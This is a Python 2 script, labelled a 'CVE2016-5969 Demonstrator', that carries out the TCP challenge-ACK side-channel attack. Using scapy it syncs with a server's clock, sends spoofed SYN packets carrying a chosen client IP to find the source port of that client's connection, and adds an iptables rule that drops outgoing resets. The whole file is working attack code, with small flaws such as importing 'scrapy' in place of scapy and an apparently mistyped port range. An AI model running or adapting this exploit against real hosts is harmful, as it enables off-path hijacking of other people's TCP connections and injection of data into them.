import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logger = logging.getLogger(__name__)

from scrapy.all import *
from multiprocessing import Process, Queue
import sys
import time
import copy
import argparse
import os
import random



# Handles the initial TCP handshake
class TcpHandshake(object):
    def __init__(self, target):
        self.seq = 0
        self.seq_next = 0
        self.target = target
        self.dst = target[0]
        self.dport = target[1]
        self.sport = random.randrange(0, 2 ** 16)
        self.l4 = IP(dst=target[0]) / TCP(sport=self.sport, dport=self.dport, flags=0, seq=random.randrange(0, 2 ** 32))
        self.src = self.l4.src
        self.swin = self.l4[TCP].window
        self.dwin = 1
        self.alive = False
        self.next_srv_ack = 0

    def handle_recv(self, pkt):
        if pkt and pkt.haslayer(IP) and pkt.haslayer(TCP):
            if pkt[TCP].flags & 0x3f == 0x12:  # SYN+ACK
                logger.debug("RCV: SYN+ACK")
                return self.send_synack_ack(pkt)
            if pkt[TCP].flags & 0x3f == 0x18:  # PSH+ACK
                logger.debug("RCV: PSH+ACK")
                self.next_srv_ack = pkt.seq + len(pkt[Raw])
                logger.debug('Handshake Completed')
                return
            elif pkt[TCP].flags & 4 != 0:  # RST
                logger.debug("RCV: RST")
                raise Exception("RST")
            elif pkt[TCP].flags & 0x1 == 1:  # FIN
                logger.debug("RCV: FIN")
                return self.send_finack(pkt)
            elif pkt[TCP].flags & 0x3f == 0x10:  # FIN+ACK
                logger.debug("RCV: FIN+ACK")
                return self.send_ack(pkt)

        logger.debug("RCV: %s" % repr(pkt))
        return None

    def send_syn(self, sport=None):
        logger.info('Starting Handshake')
        logger.debug("Sent: SYN")
        if sport:
            self.sport = sport
        self.l4[TCP].flags = "S"
        self.seq_next = self.l4[TCP].seq + 1
        response = sr1(self.l4, verbose=False)
        self.l4[TCP].seq += 1
        return self.handle_recv(response)

    def send_synack_ack(self, pkt):
        logger.debug("Sent: ACK to SYN+ACK")
        self.l4[TCP].ack = pkt[TCP].seq + 1
        self.l4[TCP].flags = "A"
        self.seq_next = self.l4[TCP].seq
        response = sr1(self.l4, verbose=False)
        self.alive = True
        return self.handle_recv(response)

    def send_data(self, d):
        self.l4[TCP].flags = "PA"
        response = self._sr1(self.l4 / d)
        self.seq_next = self.l4[TCP].seq + len(d)
        self.l4[TCP].seq += len(d)
        # return self.handle_recv(response)

    def send_fin(self):
        logger.debug("SND: FIN")
        self.l4[TCP].flags = "F"
        self.seq_next = self.l4[TCP].seq + 1
        response = self._sr1(self.l4)
        self.l4[TCP].seq += 1
        return self.handle_recv(response)

    def send_finack(self, pkt):
        logger.debug("SND: FIN+ACK")
        self.l4[TCP].flags = "FA"
        self.l4[TCP].ack = pkt[TCP].seq + 1
        self.seq_next = self.l4[TCP].seq + 1
        response = send(self.l4)
        self.l4[TCP].seq += 1
        raise Exception("FIN+ACK")

    def send_ack(self, pkt):
        logger.debug("SND: ACK")
        self.l4[TCP].flags = "A"
        self.l4[TCP].ack = pkt[TCP].seq + 1
        self.seq_next = self.l4[TCP].seq + 1
        response = self._sr1(self.l4)
        self.l4[TCP].seq += 1

    def send_bulk(self, pcount):
        self.l4[TCP].sport = self.sport
        self.l4[TCP].flags = "R"
        self.l4[TCP].seq = self.seq_next + 666
        send(self.l4 / '.', count=pcount, verbose=False)
        # self.seq_next = self.l4[TCP].seq + len(d)
        # self.l4[TCP].seq += len(d)

    # Takes a list of source ports and returns a set of prepared packets
    def ports(self, ports):
        x = []
        pkt = copy.deepcopy(self.l4)
        pkt[TCP].flags = "S"
        pkt[IP].src = args.clientip
        for i in ports:
            pkt[TCP].sport = i
            x.append(pkt / '.')
        return x


# Sniffs for packets, threaded.
class sniffer():
    def __init__(self, srv_seq, q):
        self.q = q
        self.seq = srv_seq
        self.ca = 0

    def sniffs(self):
        build_filter = lambda (r): TCP in r and IP in r and r[IP].src == args.serverip and r[TCP].seq == self.seq
        ca = sniff(lfilter=build_filter, timeout=1.2)
        self.q.put(len(ca))

    def run(self):
        self.run = Process(target=self.sniffs)
        self.run.start()


# Super important to sync with the servers clock.
def time_sync(svr_seq, sync=False, rerun=0, rehs=0, runcount=1, sleeptime=0):
    logger.info('Starting Sync')
    while not sync:
        if (time.time()).is_integer():

            # Sleep only the time we need to make the magic happen
            time.sleep(sleeptime)

            # start sniffer
            q = Queue()
            x = sniffer(svr_seq, q)
            x.run()
            logger.debug('Starting: %s' % str(time.time()))

            # send 200 packets
            start = time.time()
            tcp_hs.send_bulk(200)
            logger.debug('Done: %s' % str(time.time()))

            # wait for results
            result = q.get()
            logger.debug(str(result))

            # If it is not 100, we are out of time. Readjust
            if result >= 200:
                rerun = 0
                sleeptime = 0.25
                logger.warn('Way out of sync: %s' % result)

            # Way out, might need to re handshake
            elif result == 0:
                rehs += 1
                if rehs >= 2:
                    tcp_hs.send_syn(random.randrange(0, 2 ** 16))
                # ... what is this doing here
                #if not tcp_hs.alive:
                    #pass
                #else:
                    #pass

            # Out of sync, adjust
            elif result > 100:
                rerun = 0
                sleeptime = 0.015 * runcount
                logger.info('Out of sync: %s' % result)

            # Looks good
            elif result == 100:
                rerun += 1
                if rerun == 3:
                    logger.info('Sync Complete')
                    return start
                else:
                    logger.info('Good Sync')
            runcount += 1


# Breaks big list to search into smaller chunks
def chunks(l, interval):
    for i in range(0, len(l), interval):
        yield l[i:i + interval]


# the magic
def find_port(srcports, synced_time, srv_seq, found=False):
    # If the range is bigger then 2000 ports, break it down.
    if len(srcports) > 2000:
        for i in chunks(srcports, 2000):
            find_port(i, synced_time, tcp_hs.next_srv_ack)

    # Break further into chunks of 500
    elif len(srcports) / 4 == 500:
        divide = 4

    # Everything else can be halved
    else:
        divide = 2

    # For each divided chunk
    for i in chunks(srcports, len(srcports) / divide):

        # Prepare everything possible outside the timer
        run = 0
        q = Queue()

        pkt_list = tcp_hs.ports(i)

        # Loop til we find the port, or return nothing
        while not found:
            if (time.time() - synced_time).is_integer():

                # Keep track of iterations
                run += 1
                logger.debug('Starting Port Sweep: %s' % str(time.time() - synced_time))

                # Start the sniffer
                sniffer(srv_seq, q).run()

                # Send the port finding packets
                send(pkt_list, verbose=False)

                # Send the challenge packets
                tcp_hs.send_bulk(150)
                logger.debug('Done Port Sweep: %s' % str(time.time() - synced_time))

                # Collect Results
                result = q.get()
                logger.debug(str(result))

                # Anything more then 100 means we lost our window
                if result > 100:
                    logger.info('Sync lost. Resyncing')
                    synced_time = time_sync(srv_seq)

                # If 100, its not here
                if result == 100:

                    # If we goto singles, the log is different
                    if len(i) > 1:
                        logger.info('Not in range %s:%s' % (i[0], i[-1]))

                        # No need to check twice if the first half is wrong.
                        if divide == 2:
                            logger.debug('Optimising Search')
                            find_port(srcports[len(srcports) / divide:], synced_time, srv_seq)
                    else:
                        logger.info('Not %s' % (i[0]))

                    # we are done with this chunk
                    break

                # Looks good...
                if result == 99:

                    # If we goto singles, the log is different
                    if len(i) > 1:
                        logger.info('Probably in range %s:%s' % (i[0], i[-1]))
                        find_port(i, synced_time, srv_seq)

                    else:
                        try:
                            find_port(i, synced_time, srv_seq)
                        except ValueError:
                            logger.info('Success. Port found. %s:%s' % (args.clientip, i[0]))

                            # Now, Lets get a sequence number :)
                            sys.exit('Time:%s' % (time.time() - timet))


if __name__ == "__main__":
    if sys.version_info > (3, 0):
        sys.exit('Script built for Python2.7. You are using 3.0 or greater.')

    # Ew, global vars
    global timet

    # Args
    parser = argparse.ArgumentParser(description='CVE2016-5969 Demonstrator.')
    parser.add_argument('-c', dest='clientip', type=str, required=True, metavar='192.168.1.1',
                        help='The target client IP.')
    parser.add_argument('-s', dest='serverip', type=str, required=True, metavar='192.168.1.10',
                        help='The target server IP.')
    parser.add_argument('-p', dest='serverport', type=int, required=True, metavar=22,
                        help='The target server port.')
    parser.add_argument('-v', dest='verbosity', type=str, required=False, metavar='v, vv', default='v',
                        choices=['v', 'vv'], help='The verbosity level')
    args = parser.parse_args()

    # Default linux ephemeral ports. Reversed.
    srcports = range(61000, 32678, -1)

    # This needs to be done for scapy to send packets without the kernel managing the connection
    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')

    # Start a timer
    timet = time.time()

    # Setup Logging
    logging.basicConfig(format='%(levelname)s:%(asctime)s %(message)s', datefmt='%I:%M:%S ')
    logging.basicConfig(level=logging.DEBUG)
    if args.verbosity == 'vv':
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    # Perform Handshake
    while True:
        start = time.time()
        tcp_hs = TcpHandshake((args.serverip, args.serverport))
        tcp_hs.send_syn()
        if not tcp_hs.alive:
            pass
        else:
            break

    synced_time = time_sync(tcp_hs.next_srv_ack)
    port = find_port(srcports, synced_time, tcp_hs.next_srv_ack)
